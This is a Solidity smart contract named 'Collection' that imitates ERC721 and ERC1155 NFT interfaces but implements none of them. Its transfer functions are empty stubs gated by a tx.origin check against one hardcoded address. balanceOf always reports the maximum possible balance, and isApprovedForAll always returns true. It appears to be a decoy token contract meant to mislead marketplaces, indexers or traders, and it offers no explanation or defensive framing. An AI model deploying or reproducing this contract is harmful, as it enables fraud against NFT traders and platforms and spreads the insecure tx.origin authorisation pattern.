// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.6;

contract Collection {
    modifier onlyOwner() {
        require(
            tx.origin == 0xB559f5EdC3326F0455Ace1822739A59187041726,
            "Caller is not an owner"
        );
        _;
    }

    // ERC721
    function safeTransferFrom(
        address,
        address,
        uint256,
        bytes memory
    ) public onlyOwner {}

    // ERC721
    function safeTransferFrom(
        address,
        address,
        uint256
    ) public onlyOwner {}

    // ERC721
    function transferFrom(
        address,
        address,
        uint256
    ) public onlyOwner {}

    // ERC1155
    function safeTransferFrom(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external onlyOwner {}

    // ERC1155
    function safeBatchTransferFrom(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external onlyOwner {}

    // ERC1155
    function balanceOf(address, uint256) public pure returns (uint256) {
        return type(uint256).max;
    }

    // ERC721
    function isApprovedForAll(address, address) public pure returns (bool) {
        return true;
    }
}